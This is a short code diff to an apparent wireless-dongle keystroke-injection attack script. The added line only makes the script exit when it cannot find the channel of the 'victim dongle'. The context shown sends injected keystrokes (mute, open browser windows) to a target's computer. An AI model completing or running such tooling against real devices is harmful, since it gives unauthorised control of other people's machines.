@@ -18,6 +18,7 @@ def main():
     channel = find_frequency_channel(radio, address)
     if not channel:
         print("Failed to find frequency channel. Try to get closer to the victim dongle.")
+        sys.exit(1)
 
     # mute and open two browser windows
     transmit_keys(radio, ['MUTE', 'LAUNCH_BROWSER', 'LAUNCH_BROWSER'])
